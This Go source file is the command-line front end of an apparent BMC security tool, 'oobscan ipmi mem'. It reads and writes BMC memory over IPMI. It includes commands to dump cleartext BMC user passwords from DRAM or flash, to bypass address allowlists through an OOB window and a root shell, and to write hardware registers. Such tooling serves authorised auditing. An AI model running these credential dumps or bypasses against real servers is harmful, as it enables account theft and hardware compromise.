package cmd

// CLI wiring for "oobscan ipmi <target> mem ...", the remote memory and
// hardware-register access surface. The wire protocols, the per-generation
// profile table and the chunking engines live in pkg/ipmi/mem.go and
// pkg/ipmi/mem_spaces.go; this file parses arguments, resolves the profile,
// reads and writes local files, and renders results.
//
// Options are key=value positional tokens rather than cobra flags, following the xdp
// subcommand. That keeps the mem-only knobs out of the shared "oobscan ipmi" flag
// namespace and sidesteps cobra's interspersed parsing, which would otherwise let
// "mem write ... --apply" set the smc-restore-shell flag of the same name.

import (
	"context"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

const ipmiMemUsage = `usage:
  mem info   [profile=<id>]
  mem probe  [profile=<id>] [<addr|region> ...]
  mem survey [profile=<id>] [delay=<dur>] [unit=1|2|4]
  mem survey confirm-rw [profile=<id>] [delay=<dur>] [apply]
  mem read   <addr|region> <length> [key=value ...]
  mem write  <addr|region> <hexbytes...|in=FILE> [key=value ...] [apply]
  mem globalvar [out=FILE]   dump the IPMI daemon's cleartext user/password
                             table from DRAM via the shm page-cache walk
                             (alias: usertable; needs kernel offsets, smc-x11)
  mem creds [via=auto|file|dram|jffs2] [aeskey=<hex>] [aesiv=<hex>]
                             dump BMC account credentials by the fastest method
                             the target supports: OEMHW1 fd_read of the /nv files
                             by path (fast, portable), else the DRAM GlobalVar
                             table (fast, needs kernel offsets), else the fully
                             portable JFFS2 flash walk (slow). via= forces one;
                             aeskey/aesiv override the built-in ATEN AES key

options (all spaces):
  space=<name>      physical (default), virtual, flash, scu, gpio, i2c, spd,
                    fru, sdr, mii, peci, nvram, shm
  key=<n>           space=shm: SysV shm key to walk (default: the profile's
                    GlobalVar key). The address is a segment offset.
  profile=<id>      pin the vendor profile instead of detecting it
  unit=1|2|4        bytes per request for the physical spaces
  pipeline=<n>      keep n physical reads in flight to hide round-trip latency
                    (v1.5 sessions; capped at 8 for session safety; ~n x faster)
  order=<o>         reply byte order: auto (default), ascending, msb-first
  chunk=<n>         bytes per request for the bus spaces
  retries=<n>       transport retries per request (default 3)
  delay=<dur>       pause between requests, e.g. 20ms
  out=<file>        write the bytes read to a file instead of hexdumping
  in=<file>         read the bytes to write from a file
  continue          fill unreadable units with zeros and report them as holes
  force             send addresses this build's allowlist is expected to refuse

write-only options:
  apply             actually send the write; without it the request bytes are
                    printed and nothing is transmitted
  verify            read each unit back after writing it (physical spaces only)
  write-subfn=<b>   pin the OEM write subfunction

bus options:
  bus=<n>           i2c/spd segment number
  slave=<addr>      i2c/spd device address (7-bit 0x50 or 8-bit 0xa0)
  addr-bytes=1|2    register-offset width inside the device (default 1)
  oem               use the vendor OEM i2c transport instead of App/0x52
  fru=<n>           FRU device id (default 0)
  record=<id>       SDR record id
  peci-cmd=<b>      raw PECI command byte
  peci-read=<n>     raw PECI read length
  apml=<plane>      host-CPU register plane: mailbox (default), sbtsi, sbrmi.
                    The mailbox plane makes the CPU EXECUTE a command, so it
                    needs 'apply' even on a read; sbtsi/sbrmi are plain reads
  socket=<n>        host CPU socket, 0 or 1
  pin=<n>           GPIO pin number, where the firmware has a pin-level command.
                    A pin read takes no address or length: mem read space=gpio pin=42
  via=wst           read flash through the ATEN streaming dump chain instead of
                    the memory-mapped window

survey maps the readable surface of a build's physical-read primitive in
one pass: a zero-length probe of every ASPEED controller page across the SoC
(the SCU, SDRAM controller, eSPI and the
XDMA engine among them), then a real read of each address the allowlist accepts,
then a read of each accepted whole page near its top - base+0xffc and a
boundary-crossing base+0xffe with a 4-byte unit - which shows whether the build
re-checks offset+width against the page or reads past the single mapped page.
Pace it with delay= on ATEN boards, which lock a source out under bursts.
Real MMIO reads can have hardware side effects; use an approved maintenance window.

survey confirm-rw actively proves the write primitive on an unrestricted build:
it reads SCU04, sends the identical word back through the profile's write
subfunction, and verifies the value is unchanged. Without apply it stages and
sends nothing; with apply it sends exactly one same-value write.

AMI MegaRAC (YAFU) options:
  checksum=<algo>   request checksum: crc32 (default; the reflected CRC-32 the
                    firmware actually uses), sum32, sum16, sum8, twos8, xor8,
                    zero, or probe to resolve it against the handler's own
                    mismatch error
  arm               run AMIYAFUActivateFlashMode first. THIS PUTS THE BMC INTO
                    FIRMWARE-UPDATE MODE and needs 'apply' as well
  disarm            leave flash mode when the transfer finishes`

// ipmiMemOpts is one parsed "mem" invocation.
type ipmiMemOpts struct {
	space     ipmi.MemSpace
	profileID string
	unit      int
	order     ipmi.MemByteOrder
	chunk     int
	retries   int
	delay     time.Duration
	outFile   string
	inFile    string
	cont      bool
	force     bool
	apply     bool
	verify    bool
	writeSub  *byte

	bus       byte
	slave     byte
	addrBytes int
	useOEM    bool
	fruID     byte
	record    uint16
	peciCmd   byte
	peciRead  int
	apmlPlane ipmi.APMLPlane
	socket    byte
	pin       int
	via       string
	checksum  ipmi.YAFUChecksum
	probeSum  bool
	arm       bool
	disarm    bool
	espi      bool

	shmKey    uint32 // space=shm: SysV shm key (0 => the profile's GlobalVar key)
	shmKeySet bool

	aesKey string // mem creds: AES key/IV override (hex); empty => built-in ATEN default
	aesIV  string

	pipeline int // physical read: keep N requests in flight (v1.5; 0/1 = serial)

	// positional leftovers, in order
	pos []string
}

func parseIPMIMemArgs(args []string) (*ipmiMemOpts, error) {
	o := &ipmiMemOpts{space: ipmi.MemSpacePhysical, addrBytes: 1, pin: -1, apmlPlane: ipmi.APMLMailbox, checksum: ipmi.YAFUCRC32}
	for _, a := range args {
		switch strings.ToLower(a) {
		case "continue":
			o.cont = true
			continue
		case "force":
			o.force = true
			continue
		case "apply":
			o.apply = true
			continue
		case "verify":
			o.verify = true
			continue
		case "oem":
			o.useOEM = true
			continue
		case "arm":
			o.arm = true
			continue
		case "disarm":
			o.disarm = true
			continue
		case "espi":
			o.espi = true
			continue
		}
		k, v, ok := strings.Cut(a, "=")
		if !ok {
			o.pos = append(o.pos, a)
			continue
		}
		k = strings.ToLower(strings.TrimSpace(k))
		v = strings.TrimSpace(v)
		var err error
		switch k {
		case "space":
			o.space, err = ipmi.ParseMemSpace(v)
		case "profile":
			o.profileID = v
		case "unit", "width":
			o.unit, err = strconv.Atoi(v)
		case "order", "reply-order", "byte-order":
			o.order, err = ipmi.ParseMemByteOrder(v)
		case "chunk":
			o.chunk, err = strconv.Atoi(v)
		case "retries":
			o.retries, err = strconv.Atoi(v)
		case "delay":
			o.delay, err = time.ParseDuration(v)
		case "out":
			o.outFile = v
		case "in":
			o.inFile = v
		case "write-subfn", "write-sub", "wsubfn":
			var b byte
			b, err = parseByteArg(v)
			if err == nil {
				o.writeSub = &b
			}
		case "bus":
			o.bus, err = parseByteArg(v)
		case "slave", "addr7", "device":
			o.slave, err = parseByteArg(v)
		case "addr-bytes", "addrbytes", "offset-bytes":
			o.addrBytes, err = strconv.Atoi(v)
		case "fru", "fru-id":
			o.fruID, err = parseByteArg(v)
		case "record", "record-id":
			var n uint64
			n, err = strconv.ParseUint(v, 0, 16)
			o.record = uint16(n)
		case "peci-cmd":
			o.peciCmd, err = parseByteArg(v)
		case "peci-read":
			o.peciRead, err = strconv.Atoi(v)
		case "apml", "plane":
			o.apmlPlane, err = ipmi.ParseAPMLPlane(v)
		case "socket", "cpu":
			o.socket, err = parseByteArg(v)
		case "pin":
			o.pin, err = strconv.Atoi(v)
		case "key":
			var n uint64
			n, err = strconv.ParseUint(v, 0, 32)
			if err == nil {
				o.shmKey = uint32(n)
				o.shmKeySet = true
			}
		case "pipeline", "pipe", "window":
			o.pipeline, err = strconv.Atoi(v)
		case "aeskey":
			o.aesKey = strings.TrimPrefix(strings.ToLower(v), "0x")
		case "aesiv":
			o.aesIV = strings.TrimPrefix(strings.ToLower(v), "0x")
		case "via", "source":
			o.via = strings.ToLower(v)
		case "checksum", "cksum":
			o.checksum, err = ipmi.ParseYAFUChecksum(v)
			o.probeSum = err == nil && o.checksum == ""
		default:
			return nil, fmt.Errorf("unknown mem option %q (%s)", k, ipmiMemUsage)
		}
		if err != nil {
			return nil, fmt.Errorf("invalid mem option %s=%q: %w", k, v, err)
		}
	}
	if o.addrBytes != 1 && o.addrBytes != 2 {
		return nil, fmt.Errorf("invalid addr-bytes %d (use 1 or 2)", o.addrBytes)
	}
	if o.unit != 0 && o.unit != 1 && o.unit != 2 && o.unit != 4 {
		return nil, fmt.Errorf("invalid unit %d (use 1, 2 or 4)", o.unit)
	}
	if o.pin > 0xdf {
		return nil, fmt.Errorf("invalid pin %d (the handler bounds pins to 0x00-0xdf)", o.pin)
	}
	if o.pin < -1 {
		return nil, fmt.Errorf("invalid pin %d", o.pin)
	}
	if o.chunk < 0 || o.retries < 0 || o.peciRead < 0 || o.pipeline < 0 {
		return nil, fmt.Errorf("invalid negative chunk/retries/peci-read/pipeline")
	}
	return o, nil
}

// parseMemAddr accepts a hex or decimal address, or the name of a region in
// the resolved profile ("uboot-env", "scu", "nv", ...).
func parseMemAddr(p *ipmi.MemProfile, v string) (uint64, string, error) {
	if p != nil {
		if r, ok := p.Region(v); ok {
			return r.Addr, r.Name, nil
		}
	}
	n, err := strconv.ParseUint(strings.TrimSpace(v), 0, 64)
	if err != nil {
		hint := ""
		if p != nil && len(p.Regions) > 0 {
			hint = fmt.Sprintf(" (named regions on %s: %s)", p.ID, strings.Join(p.RegionNames(), ", "))
		}
		return 0, "", fmt.Errorf("invalid address %q%s", v, hint)
	}
	return n, "", nil
}

// parseMemLength accepts a byte count, optionally with a k/m suffix, or the
// size of a named region.
func parseMemLength(p *ipmi.MemProfile, v string) (int, error) {
	s := strings.ToLower(strings.TrimSpace(v))
	if p != nil {
		if r, ok := p.Region(s); ok && r.Size > 0 {
			return int(r.Size), nil
		}
	}
	mult := uint64(1)
	switch {
	case strings.HasSuffix(s, "k"), strings.HasSuffix(s, "kb"):
		mult, s = 1024, strings.TrimSuffix(strings.TrimSuffix(s, "b"), "k")
	case strings.HasSuffix(s, "m"), strings.HasSuffix(s, "mb"):
		mult, s = 1024*1024, strings.TrimSuffix(strings.TrimSuffix(s, "b"), "m")
	}
	n, err := strconv.ParseUint(s, 0, 32)
	if err != nil {
		return 0, fmt.Errorf("invalid length %q", v)
	}
	total := n * mult
	if total == 0 || total > 1<<28 {
		return 0, fmt.Errorf("invalid length %q (must be 1..256MiB)", v)
	}
	return int(total), nil
}

// resolveMemProfile honours profile=<id> and otherwise detects one.
func resolveMemProfile(ctx context.Context, sess *ipmi.CmdSess, o *ipmiMemOpts) (*ipmi.MemProfile, *ipmi.MemProfileDetection, error) {
	if o.profileID != "" {
		p, ok := ipmi.MemProfileByID(o.profileID)
		if !ok {
			return nil, nil, fmt.Errorf("unknown profile %q (available: %s)", o.profileID, strings.Join(ipmi.MemProfileIDs(), ", "))
		}
		return &p, &ipmi.MemProfileDetection{Profile: p, Source: "pinned"}, nil
	}
	det, err := sess.DetectMemProfile(ctx)
	if err != nil {
		return nil, nil, err
	}
	p := det.Profile
	return &p, det, nil
}

// runIPMIMem dispatches the mem subcommands.
func runIPMIMem(ctx context.Context, sess *ipmi.CmdSess, args []string) (any, error) {
	if len(args) == 0 {
		return nil, fmt.Errorf("%s", ipmiMemUsage)
	}
	verb := strings.ToLower(args[0])
	o, err := parseIPMIMemArgs(args[1:])
	if err != nil {
		return nil, err
	}
	prof, det, err := resolveMemProfile(ctx, sess, o)
	if err != nil {
		return nil, err
	}

	switch verb {
	case "info":
		return ipmiMemInfo(prof, det), nil
	case "probe":
		return ipmiMemProbe(sess, prof, o)
	case "survey":
		if len(o.pos) > 0 && strings.EqualFold(o.pos[0], "confirm-rw") {
			return ipmiMemSurveyConfirmRW(ctx, sess, prof, o)
		}
		return ipmiMemSurvey(ctx, sess, prof, o)
	case "read":
		return ipmiMemRead(ctx, sess, prof, det, o)
	case "write":
		return ipmiMemWrite(ctx, sess, prof, det, o)
	case "globalvar", "usertable":
		return ipmiMemGlobalVar(ctx, sess, prof, o)
	case "creds", "flashcreds", "flash-creds":
		return ipmiMemFlashCreds(ctx, sess, prof, o)
	}
	return nil, fmt.Errorf("unsupported mem command %q\n%s", verb, ipmiMemUsage)
}

// --- info -------------------------------------------------------------------

func ipmiMemInfo(p *ipmi.MemProfile, det *ipmi.MemProfileDetection) map[string]any {
	spaces := make([]string, 0, len(ipmi.MemSpaces))
	for _, sp := range ipmi.MemSpaces {
		if ok, _ := p.SupportsSpace(sp); ok {
			spaces = append(spaces, string(sp))
		}
	}
	res := map[string]any{
		"action":        "mem info",
		"profile":       p.ID,
		"profileSource": det.Source,
		"generations":   p.Generations,
		"summary":       p.Summary,
		"confidence":    p.Confidence,
		"physicalRead":  p.ReadSupported,
		"physicalWrite": p.WriteSupported,
		"maxUnit":       p.MaxUnit,
		"replyOrder":    string(p.ReplyOrder),
		"spaces":        strings.Join(spaces, ", "),
	}
	if det.Vendor != "" {
		res["vendor"] = det.Vendor
	}
	if det.Generation != "" {
		res["detectedGeneration"] = det.Generation
	}
	if det.Firmware != "" {
		res["firmware"] = det.Firmware
	}
	if det.Warning != "" {
		res["warning"] = det.Warning
	}
	if len(p.AllowedPages) > 0 {
		parts := make([]string, 0, len(p.AllowedPages))
		for _, r := range p.AllowedPages {
			parts = append(parts, fmt.Sprintf("0x%08x (%s)", r.Page, r.Note))
		}
		res["allowlist"] = strings.Join(parts, "; ")
	} else if p.ReadSupported {
		res["allowlist"] = "none - every physical address is accepted"
	}
	if names := p.RegionNames(); len(names) > 0 {
		res["regions"] = strings.Join(names, ", ")
	}
	if p.WriteSubFnAmbiguous {
		res["writeSubfnAmbiguous"] = "the write subfunction is not settled for this generation; pin it with write-subfn="
	}
	if p.LockdownGated {
		res["lockdown"] = "the write additionally requires system lockdown to be off (CC 0xd4 when locked)"
	}
	if p.Hazards != "" {
		res["hazards"] = p.Hazards
	}
	return res
}

// --- probe ------------------------------------------------------------------

// ipmiMemProbe maps what a build's allowlist accepts using zero-length reads,
// which run the whole filter and return without touching the bus.
func ipmiMemProbe(sess *ipmi.CmdSess, p *ipmi.MemProfile, o *ipmiMemOpts) (any, error) {
	if !p.ReadSupported {
		return nil, fmt.Errorf("profile %s has no physical-memory read primitive to probe", p.ID)
	}
	targets := []uint64{}
	labels := []string{}
	if len(o.pos) > 0 {
		for _, a := range o.pos {
			addr, name, err := parseMemAddr(p, a)
			if err != nil {
				return nil, err
			}
			targets = append(targets, addr)
			labels = append(labels, name)
		}
	} else {
		// The default sweep is the set of pages that separate the known
		// builds: GPIO, I2C, a MAC offset, SCU and DRAM.
		for _, d := range []struct {
			addr uint64
			name string
		}{
			{0x1e780000, "gpio"},
			{0x1e78a008, "i2c"},
			{0x1e6600a0, "mac1+0xa0"},
			{0x1e6e2000, "scu"},
			{0x20000000, "flash-window"},
			{0x80000000, "dram"},
		} {
			targets = append(targets, d.addr)
			labels = append(labels, d.name)
		}
	}

	type row struct {
		Address  string `json:"address"`
		Region   string `json:"region,omitempty"`
		Accepted string `json:"accepted"`
		CC       string `json:"cc"`
		Expected string `json:"expected"`
	}
	rows := make([]row, 0, len(targets))
	for i, addr := range targets {
		accepted, cc, err := sess.MemProbePage(p, addr)
		r := row{Address: fmt.Sprintf("0x%08x", addr), Region: labels[i]}
		if err != nil {
			r.Accepted = "error"
			r.CC = err.Error()
		} else {
			r.Accepted = yesNoWord(accepted)
			r.CC = fmt.Sprintf("0x%02x", cc)
		}
		r.Expected = yesNoWord(p.AllowsPhysical(addr))
		rows = append(rows, r)
		if o.delay > 0 {
			time.Sleep(o.delay)
		}
	}
	return rows, nil
}

// --- survey -----------------------------------------------------------------

// memSurveyRow is one line of a survey: a full-range probe, a base read, or a
// large-offset read, with the handler's answer.
type memSurveyRow struct {
	Phase    string `json:"phase"`
	Address  string `json:"address"`
	Region   string `json:"region,omitempty"`
	Accepted string `json:"accepted"`
	CC       string `json:"cc"`
	Data     string `json:"data,omitempty"`
	Note     string `json:"note,omitempty"`
}

// surveyHighlights are the security-relevant controllers a survey reads for real
// on an unrestricted build, where "every address is allowed" would otherwise
// mean reading all 35 SoC pages. The allowlisted builds are driven by their own
// rules instead, so this set only scopes the no-allowlist case.
var surveyHighlights = map[string]bool{
	"fmc": true, "sdmc": true, "sdmc-mcr08": true, "scu": true, "scu04": true,
	"scu-rng": true, "xdma": true, "espi": true, "gpio": true, "i2c": true,
	"mac1": true, "lpc-post": true, "flash-window": true, "dram": true,
}

// ipmiMemSurvey maps the whole readable surface of a build's physical-read
// primitive in one pass: a zero-length probe of every ASPEED
// controller page, a real read of each allowlisted base, and a near-top read of
// each accepted whole page to exercise the handler's offset+width page-boundary
// check. Real MMIO reads can have hardware side effects.
func ipmiMemSurvey(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, o *ipmiMemOpts) (any, error) {
	if !p.ReadSupported {
		return nil, fmt.Errorf("profile %s has no physical-memory read primitive to survey", p.ID)
	}
	// ATEN boards lock a source out under bursts, so pace by default.
	delay := o.delay
	if delay == 0 {
		delay = 20 * time.Millisecond
	}
	unit := o.unit
	if unit == 0 {
		unit = p.MaxUnit
	}
	pace := func() {
		if delay > 0 {
			time.Sleep(delay)
		}
	}

	pages := ipmi.ASPEEDSurveyPages()
	rows := make([]memSurveyRow, 0, len(pages)*2)

	// Phase 1 - zero-length probe. A zero-length read runs the whole
	// allowlist filter and returns without touching the bus, so this maps what
	// the build accepts across the SoC - SCU, SDRAM controller, eSPI, XDMA and
	// all - without a single real access.
	for _, pg := range pages {
		if err := ctx.Err(); err != nil {
			return rows, err
		}
		accepted, cc, err := sess.MemProbePage(p, pg.Addr)
		r := memSurveyRow{Phase: "probe", Address: fmt.Sprintf("0x%08x", pg.Addr), Region: pg.Name, Note: pg.Desc}
		if err != nil {
			r.Accepted, r.CC = "error", err.Error()
		} else {
			r.Accepted, r.CC = yesNoWord(accepted), fmt.Sprintf("0x%02x", cc)
		}
		rows = append(rows, r)
		pace()
	}

	// Resolve the set of allowed bases to read for real. An allowlisted build
	// gives its own rules; an unrestricted build accepts everything, so the
	// highlighted SoC pages are the interesting ones.
	type sample struct {
		base, high uint64
		whole      bool
		name       string
	}
	var samples []sample
	if len(p.AllowedPages) == 0 {
		for _, pg := range pages {
			if !surveyHighlights[pg.Name] {
				continue
			}
			base := pg.Addr &^ uint64(0xfff)
			samples = append(samples, sample{base: pg.Addr, high: base | 0xffc, whole: true, name: pg.Name})
		}
	} else {
		for _, s := range p.AllowedSamples() {
			nm := s.Note
			if nm == "" {
				nm = socPageName(pages, uint64(s.Page))
			}
			samples = append(samples, sample{base: uint64(s.Base), high: uint64(s.High), whole: s.Whole, name: nm})
		}
	}

	readRow := func(phase, name string, addr uint64, width int) memSurveyRow {
		r := memSurveyRow{Phase: phase, Address: fmt.Sprintf("0x%08x", addr), Region: name}
		data, cc, err := sess.MemReadUnitAt(p, addr, width)
		if err != nil {
			if cc != 0 {
				r.Accepted, r.CC = "no", fmt.Sprintf("0x%02x", cc)
			} else {
				r.Accepted, r.CC = "error", err.Error()
			}
			return r
		}
		r.Accepted, r.CC, r.Data = "yes", "0x00", fmt.Sprintf("%x", data)
		return r
	}

	// Phase 2 - read each allowed base for real.
	for _, s := range samples {
		if err := ctx.Err(); err != nil {
			return rows, err
		}
		rows = append(rows, readRow("read-base", s.name, s.base, unit))
		pace()
	}

	// Phase 3 - read each accepted whole page near its top. base+0xffc is the
	// last in-bounds 4-byte unit; base+0xffe with a 4-byte unit runs two bytes
	// off the end of the 4 KiB page. A handler that re-checks offset+width
	// refuses it (CC 0xcc); one that does not answers from whatever the single
	// mapped page abuts, which is the copy-loop spill the allowlist audit found.
	crossWidth := max(p.MaxUnit, 2)
	for _, s := range samples {
		if !s.whole {
			continue
		}
		if err := ctx.Err(); err != nil {
			return rows, err
		}
		page := s.base &^ uint64(0xfff)
		rows = append(rows, readRow("read-offset", fmt.Sprintf("%s+0xffc", s.name), page|0xffc, unit))
		pace()
		cross := readRow("read-offset", fmt.Sprintf("%s+0xffe", s.name), page|0xffe, crossWidth)
		cross.Note = "offset+width runs past the 4 KiB page"
		rows = append(rows, cross)
		pace()
	}

	return rows, nil
}

// socPageName finds the ASPEED map name for a page base, for labelling an
// allowlist sample whose rule carries no note of its own.
func socPageName(pages []ipmi.SurveyPage, page uint64) string {
	for _, pg := range pages {
		if pg.Addr&^uint64(0xfff) == page {
			return pg.Name
		}
	}
	return fmt.Sprintf("0x%08x", page)
}

// ipmiMemSurveyConfirmRW proves a physical write without changing state. It
// reads the SCU04 reset-domain word, sends the same word back, and verifies the
// register. The default is staged: without apply no write is transmitted.
func ipmiMemSurveyConfirmRW(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, o *ipmiMemOpts) (any, error) {
	if len(o.pos) > 1 {
		return nil, fmt.Errorf("usage: mem survey confirm-rw [profile=<id>] [delay=<dur>] [apply]")
	}
	if !p.ReadSupported {
		return nil, fmt.Errorf("profile %s has no physical-memory read primitive", p.ID)
	}
	res := map[string]any{
		"action":  "mem survey confirm-rw",
		"profile": p.ID,
		"address": "0x1e6e2004",
		"region":  "scu04",
	}
	if !p.WriteSupported {
		res["applied"] = false
		res["verified"] = false
		res["writeCapable"] = false
		res["note"] = "profile has no physical-memory write primitive; no write was sent"
		return res, nil
	}
	if len(p.AllowedPages) > 0 && !p.AllowsPhysical(0x1e6e2004) {
		res["applied"] = false
		res["verified"] = false
		res["writeCapable"] = false
		res["note"] = "the profile's allowlist would refuse SCU04; no write was sent"
		return res, nil
	}
	before, cc, err := sess.MemReadUnitAt(p, 0x1e6e2004, 4)
	if err != nil {
		res["readCC"] = fmt.Sprintf("0x%02x", cc)
		return nil, fmt.Errorf("reading SCU04 before the write proof: %w", err)
	}
	res["before"] = hex.EncodeToString(before)
	res["readCC"] = "0x00"
	if o.delay > 0 {
		time.Sleep(o.delay)
	}
	if !o.apply {
		res["applied"] = false
		res["verified"] = false
		res["writeCapable"] = true
		res["wouldWrite"] = hex.EncodeToString(before)
		res["note"] = "staged only: add the bare token 'apply' to send the same value back through the write handler"
		return res, nil
	}
	wr, err := sess.MemWritePhysical(ctx, p, 0x1e6e2004, before, ipmi.MemWriteOptions{
		Unit: 4, SubFn: o.writeSub, Retries: o.retries, Delay: o.delay, Verify: true,
	})
	if wr != nil {
		res["requests"] = wr.Stats.Requests
		res["subfn"] = wr.SubFn
		res["verified"] = wr.Verified && len(wr.Mismatch) == 0
		if len(wr.Mismatch) > 0 {
			res["readbackMismatch"] = wr.Mismatch
		}
	}
	if err != nil {
		return nil, fmt.Errorf("same-value SCU04 write proof failed: %w", err)
	}
	res["applied"] = true
	res["writeCapable"] = true
	if ok, _ := res["verified"].(bool); !ok {
		return nil, fmt.Errorf("same-value SCU04 write readback mismatched")
	}
	res["note"] = "the live SCU04 word was written back unchanged and verified"
	return res, nil
}

// --- read -------------------------------------------------------------------

// ipmiMemReadResult carries a dump plus the accounting for how it was
// obtained. It has a dedicated arm in printIPMIResultTable so the hexdump
// survives, since table cells collapse newlines.
type ipmiMemReadResult struct {
	Action    string         `json:"action"`
	Profile   string         `json:"profile"`
	Space     string         `json:"space"`
	Address   string         `json:"address"`
	Physical  string         `json:"physical,omitempty"`
	Region    string         `json:"region,omitempty"`
	Length    int            `json:"length"`
	Unit      int            `json:"unit,omitempty"`
	Order     string         `json:"replyOrder,omitempty"`
	Requests  int            `json:"requests"`
	Retries   int            `json:"retries"`
	Holes     []ipmi.MemHole `json:"holes,omitempty"`
	OutFile   string         `json:"outFile,omitempty"`
	Note      string         `json:"note,omitempty"`
	Warning   string         `json:"warning,omitempty"`
	Hexdump   []string       `json:"-"`
	DataHex   string         `json:"dataHex,omitempty"`
	NextSDRID string         `json:"nextSdrRecord,omitempty"`
	data      []byte
}

func ipmiMemRead(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, det *ipmi.MemProfileDetection, o *ipmiMemOpts) (any, error) {
	// A pin-level GPIO read addresses a pin, not an address range.
	if o.space == ipmi.MemSpaceGPIO && o.pin >= 0 {
		v, gerr := sess.GPIOPinRead(p, byte(o.pin))
		if gerr != nil {
			return nil, gerr
		}
		return map[string]any{
			"action": "mem read", "profile": p.ID, "space": "gpio",
			"pin": o.pin, "value": fmt.Sprintf("0x%02x", v),
		}, nil
	}
	// The OOB-window bypass reads DRAM the 0xC0 page allowlist refuses, via the
	// UploadOOBData dump (0x30/0xA0/0x0c) then OEMHW1 fd_read. The address is an
	// offset from the fixed window base 0x9ff00000; a length is required.
	if o.space == ipmi.MemSpaceOOB {
		if len(o.pos) < 2 {
			return nil, fmt.Errorf("usage: mem read space=oob <offset-from-0x9ff00000> <length>")
		}
		off, _, aerr := parseMemAddr(p, o.pos[0])
		if aerr != nil {
			return nil, aerr
		}
		ln, lerr := parseMemLength(p, o.pos[1])
		if lerr != nil {
			return nil, lerr
		}
		data, rerr := sess.ReadOOBWindow(uint32(off), uint32(ln))
		if rerr != nil {
			return nil, rerr
		}
		base := uint64(0x9ff00000) + off
		return map[string]any{
			"action": "mem read", "space": "oob", "profile": p.ID,
			"windowBase": "0x9ff00000", "offset": fmt.Sprintf("0x%x", off),
			"length": len(data), "hexdump": memHexdump(data, base),
		}, nil
	}
	if len(o.pos) < 1 {
		return nil, fmt.Errorf("usage: mem read <addr|region> <length> [key=value ...]")
	}
	addr, region, err := parseMemAddr(p, o.pos[0])
	if err != nil {
		return nil, err
	}
	// These spaces address one register or one transaction, so a length is
	// neither required nor meaningful.
	singleRegister := o.space == ipmi.MemSpaceCPU || o.space == ipmi.MemSpaceMII
	length := 0
	switch {
	case len(o.pos) >= 2:
		if length, err = parseMemLength(p, o.pos[1]); err != nil {
			return nil, err
		}
	case region != "":
		r, _ := p.Region(region)
		if r.Size == 0 {
			return nil, fmt.Errorf("region %q has no default size; pass a length", region)
		}
		length = int(r.Size)
	case singleRegister:
		length = 4
	case o.space == ipmi.MemSpacePECI:
		length = o.peciRead
		if length == 0 {
			return nil, fmt.Errorf("usage: mem read space=peci <cmd> <length> peci-cmd=<b>")
		}
	default:
		return nil, fmt.Errorf("usage: mem read <addr|region> <length> [key=value ...]")
	}

	// via=shell: read BMC physical memory through the deployed smc-restore-shell root
	// shell + /dev/mem. This is a full bypass of the 0x30/0x70/0xC0 page allowlist
	// (H13) and of a build whose IPMI handler's /dev/mem open fails (X10 fw 3.53).
	// Physical addressing only; a length is required.
	if o.via == "shell" {
		return ipmiMemShellRead(sess.Host(), uint32(addr), length, o)
	}

	res := &ipmiMemReadResult{
		Action:  "mem read",
		Profile: p.ID,
		Space:   string(o.space),
		Address: fmt.Sprintf("0x%08x", addr),
		Region:  region,
		Length:  length,
	}
	warn := []string{}
	if det != nil && det.Warning != "" {
		warn = append(warn, det.Warning)
	}
	if p.ReadHazard != "" {
		warn = append(warn, p.ReadHazard)
	}
	// A build whose flash window is not in linear-read mode answers a read
	// there with zeros rather than an error, which is indistinguishable from
	// erased flash unless it is called out.
	if p.FlashWindowDark && (o.space == ipmi.MemSpaceFlash ||
		(o.space == ipmi.MemSpacePhysical && p.FlashBase > 0 && addr >= p.FlashBase && addr < p.FlashBase+p.FlashSize)) {
		warn = append(warn, "this build leaves the FMC CE0 window in command mode, so linear reads of the flash region return ZEROS rather than flash content - all-zero output here is not evidence of erased flash")
	}
	res.Warning = strings.Join(warn, " ")

	var data []byte
	var stats ipmi.MemStats
	bus := ipmi.MemBusOptions{
		Bus: o.bus, Slave: o.slave, AddrBytes: o.addrBytes, Chunk: o.chunk,
		FRUID: o.fruID, UseOEM: o.useOEM,
		Retries: o.retries, Delay: o.delay,
	}

	if o.space == ipmi.MemSpaceFlash && (o.via == "wst" || o.via == "dump") {
		return ipmiMemFlashDump(ctx, sess, p, length, o)
	}
	if p.YAFUMemory {
		// The YAFU pair addresses the IPMI daemon's process image, not the
		// SoC. Silently answering a physical request out of daemon memory
		// would hand back plausible bytes for an address the caller never
		// asked about, so the space has to be named correctly.
		if o.space == ipmi.MemSpacePhysical {
			return nil, fmt.Errorf("profile %s has no physical-memory primitive: its read reaches the IPMI daemon's virtual address space, not the SoC. Ask for space=virtual if that is what you want", p.ID)
		}
		if o.space == ipmi.MemSpaceVirtual {
			return ipmiMemYAFURead(ctx, sess, p, addr, length, o)
		}
	}

	switch o.space {
	case ipmi.MemSpacePhysical, ipmi.MemSpaceVirtual, ipmi.MemSpaceFlash, ipmi.MemSpaceSCU, ipmi.MemSpaceGPIO:
		phys, note, terr := p.TranslateSpace(o.space, addr)
		if terr != nil {
			return nil, terr
		}
		res.Physical = fmt.Sprintf("0x%08x", phys)
		res.Note = note
		unit := o.unit
		if unit == 0 {
			unit = p.MaxUnit
		}
		res.Unit = unit
		order := o.order
		if order == "" {
			order = p.ReplyOrder
		}
		res.Order = string(order)
		// 1-4 bytes per request makes a large range a multi-hour transfer
		// rather than a slow one; say so up front instead of letting it run.
		if reqs := (length + unit - 1) / unit; reqs > 4096 {
			res.Warning = strings.TrimSpace(res.Warning + fmt.Sprintf(
				" this range needs about %d requests at %d byte(s) each; at the measured 3-4 requests/sec that is roughly %d minutes. Narrow the range or raise unit.",
				reqs, unit, reqs/200))
		}
		var holes []ipmi.MemHole
		data, holes, stats, err = sess.MemReadPhysical(ctx, p, phys, length, ipmi.MemReadOptions{
			Unit: o.unit, ReplyOrder: o.order, Retries: o.retries, Delay: o.delay,
			ContinueOnError: o.cont, SkipAllowlistCheck: o.force, Pipeline: o.pipeline,
		})
		res.Holes = holes
	case ipmi.MemSpaceSHM:
		key := o.shmKey
		if !o.shmKeySet {
			if p.ShmWalk == nil {
				return nil, fmt.Errorf("profile %s has no shm page-cache walk parameters (currently smc-x11); cannot read space=shm", p.ID)
			}
			key = p.ShmWalk.GVKey
		}
		loc, lerr := sess.MemShmLocate(p, key)
